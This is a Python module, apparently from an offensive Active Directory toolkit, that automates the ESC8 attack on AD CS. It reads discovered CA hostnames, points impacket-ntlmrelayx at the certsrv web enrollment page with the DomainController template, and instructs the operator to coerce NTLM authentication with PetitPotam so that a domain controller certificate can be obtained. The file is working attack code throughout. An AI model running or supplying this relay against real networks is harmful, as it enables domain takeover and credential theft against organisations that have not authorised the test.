# modules/adcs/esc8.py

import os
import shutil
from core.helpers import run_command
from core.colors import blue, green, red, yellow


def abuse_esc8(session):
    print(blue("[*] ESC8: NTLM Relay to AD CS HTTP enrollment endpoint..."))
    try:
        if not shutil.which("impacket-ntlmrelayx"):
            print(red("[-] impacket-ntlmrelayx not found in PATH."))
            return

        cas = session.adcs_metadata.get("cas", [])
        if not cas:
            print(red("[-] No CA metadata found. Run 'adcs enum' first to discover CA HTTP endpoints."))
            return

        ca_dns = cas[0].get("dns", "")
        if not ca_dns:
            print(red("[-] CA DNS hostname not found in metadata."))
            return

        target_url = f"http://{ca_dns}/certsrv/certfnsh.asp"
        listener_ip = input("[?] Your listener IP (the machine running this tool): ").strip()
        if not listener_ip:
            print(red("[-] No listener IP specified."))
            return

        print(yellow(f"[*] Target enrollment URL : {target_url}"))
        print(yellow(f"[*] Listener IP           : {listener_ip}"))
        print()
        print(yellow("[!] In a SECOND terminal, trigger NTLM coercion from a target machine."))
        print(yellow(f"[!] Example: attack coerce petitpotam <target> {listener_ip}"))
        print()

        cmd = (
            f"impacket-ntlmrelayx -t {target_url} --adcs "
            f"--template DomainController -smb2support"
        )
        print(blue(f"[*] Starting relay listener: {cmd}"))
        print(yellow("[*] Press Ctrl+C to stop the relay.\n"))
        os.system(cmd)

    except KeyboardInterrupt:
        print(yellow("\n[!] ESC8 relay stopped by user."))
    except Exception as e:
        print(red(f"[!] ESC8 failed: {e}"))
